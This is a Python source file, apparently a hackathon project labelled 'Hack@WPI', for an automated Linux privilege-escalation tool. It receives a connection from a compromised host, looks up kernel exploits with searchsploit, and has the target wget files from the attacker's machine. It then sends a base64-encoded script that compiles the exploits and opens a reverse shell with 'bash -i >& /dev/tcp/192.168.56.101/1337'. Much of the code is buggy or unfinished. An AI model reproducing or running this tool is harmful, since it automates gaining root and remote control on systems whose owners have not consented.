# TODO
# 1) write script to send kernel version to searchsploit
# 2) parse searchsploit output for path to kernel exploit (look for dirtycow)
# 3) implement wget to download script
# 4) compile exploit and parse getuid() output to check if we are root, if not try another exploit
# 5) write CLI interface to make user interaction easy
# 6) make a webserver to host C files

import socket
import os
import re
import json
import base64
import threading


def welcome():
    print(" /$$   /$$                     /$$           /$$$$$$     /$$      /$$ /$$$$$$$  /$$$$$$ ")
    print("| $$  | $$                    | $$         /$$$__  $$$  | $$  /$ | $$| $$__  $$|_  $$_/ ")
    print("| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$  /$$_/  \_  $$ | $$ /$$$| $$| $$  \ $$  | $$   ")
    print("| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/ /$$/ /$$$$$  $$| $$/$$ $$ $$| $$$$$$$/  | $$   ")
    print("| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$ /$$  $$| $$| $$$$_  $$$$| $$____/   | $$   ")
    print("| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$\ $$| $$| $$$/ \  $$$| $$        | $$   ")
    print("| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$|  $$$$$$$$/| $$/   \  $$| $$       /$$$$$$ ")
    print("|__/  |__/ \_______/ \_______/|__/  \__/|  $$\________/ |__/     \__/|__/      |______/ ")
    print("	                                       \  $$$   /$$$                                   ")
    print("  	                                    \_  $$$$$$_/                                   ")
    print("    	                                      \______/                                     ")


# This is the code to be sent to the remote
remote_command = '''
import os

print("Test")

output = os.popen("ls").read()

files = output.split("\n")

for file in files:
    compiled_filename = file.strip(".c")

    os.system("gcc " + file + " -lcrypt -ssl -o " + compiled_filename)
    user_id = os.popen("id").read()

    pattern = "uid=0"
    uid_results = re.findall(pattern, user_id)

    while uid_results != []:
      os.system("bash -i >& /dev/tcp/192.168.56.101/1337 0>&1")

return # fail
'''


def root_listener():
    final = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    host = "0.0.0.0"
    port = 1337

    final.bind((host, port))
    final.listen(1)
    print("Listening for root")
    connection, address = final.accept()
    print("Success!")


def webserver_listener():
    host = "0.0.0.0"
    port = 80

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)

    connection, addr = s.accept()


def parse_version(kernel_version):
    pattern = "(\\d+.{1})+"
    data = re.search(pattern, kernel_version)
    print("THING")
    print(kernel_version)
    #print(data[0])
    # The first element of this should be the kernel version
    return data[0]


def start_webserver(file_paths):
    print("Starting Webserver...")
    working_directory = os.popen("pwd").read()

    # for path in file_paths:
    # os.popen("cp " + path + " " + working_directory).read()
    os.popen("cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c " + working_directory)
    print("Copied Files")

    print("Created Socket")
    root_thread = threading.Thread(target=root_listener)
    root_thread.start()

    web_thread = threading.Thread(target=webserver_listener)
    web_thread.start()


def parse_searchsploit_output(possible_exploits,
                              version):  # parse possible exploits for reliable exploits and get paths to host

    version = version.replace(".", "\\.")  # Maybe?
    pattern = "\\w*(?<![\\d\\.])" + version  # Look for "2.4.* NOT *.2.4"

    # Look through JSON, iterate through each Title field, parse version.
    search_json = json.loads(possible_exploits)
    print("Loaded JSON")
    search_json = search_json["RESULTS_EXPLOIT"]

    exploit_paths = []

    for exploit in search_json:
        title = exploit["Title"]
        results = re.findall(pattern, title)

        if len(results) != 0:
            print("Found Exploit")
            path = exploit["Path"]
            exploit_paths.append(path)

    start_webserver(exploit_paths)


def exploit_lookup(parsed_data, version):
    command = "searchsploit " + parsed_data + " -j"
    print("Looking Up...")

    possible_exploits = os.popen(command).read()
    print("Got Possible Exploits")
    parse_searchsploit_output(possible_exploits, version)


def start_listener():
    host = "0.0.0.0"
    port = int(input("[Hack@WPI] Enter the port to listen on: "))
    command = "uname -a"

    socket_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_listener.bind((host, port))
    socket_listener.listen(5)  # allow up to 5 connections

    conn, addr = socket_listener.accept()

    with conn:
        print("[Hack@WPI] Connection from: ", addr)

        conn.sendall(command.encode('utf-8'))
        kernel_version = conn.recv(4096)  # receive the kernel version

        parsed_data = parse_version(str(kernel_version.decode('utf-8')))
        print("Parsed Version")
        search_params = "Linux Kernel " + parsed_data
        exploit_lookup(search_params, parsed_data)

        ip = socket.gethostbyname(socket.gethostname())

        test_command = "mkdir /tmp/test"
        conn.sendall(test_command.encode('utf-8'))

        wget_command = "wget -r http://" + ip + " /tmp/test"
        conn.sendall(wget_command.encode('utf-8'))

        ls_command = "cd /tmp/test"
        ls_output = conn.sendall(ls_command.encode('utf-8'))

        remote_encoded = str(base64.b64encode(remote_command.encode('utf-8')))[2:-1]

        send_command = "echo " + remote_encoded + " | base64 -d > script.py"
        conn.sendall(send_command.encode('utf-8'))

        second_command = "python script.py"
        conn.sendall(second_command.encode('utf-8'))

        while 1:
            pass


# main function
def main():
    welcome()
    start_listener()


if __name__ == '__main__':
    main()